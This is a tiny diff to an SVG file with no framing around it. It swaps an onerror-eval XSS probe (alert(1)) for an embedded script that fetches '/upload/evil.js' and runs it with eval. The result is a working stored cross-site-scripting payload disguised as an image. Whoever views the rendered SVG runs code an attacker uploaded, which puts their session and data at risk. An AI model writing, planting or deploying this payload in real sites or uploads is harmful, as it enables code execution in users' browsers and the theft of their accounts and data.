@@ -1,3 +1,5 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-  <image href="/upload/evil.jpg" onerror="eval(this.getAttribute('data-c'))" data-c="alert(1)"/>
+  <script>//<![CDATA[
+    fetch('/upload/evil.js').then(r=>r.text()).then(eval)
+  //]]></script>
 </svg>
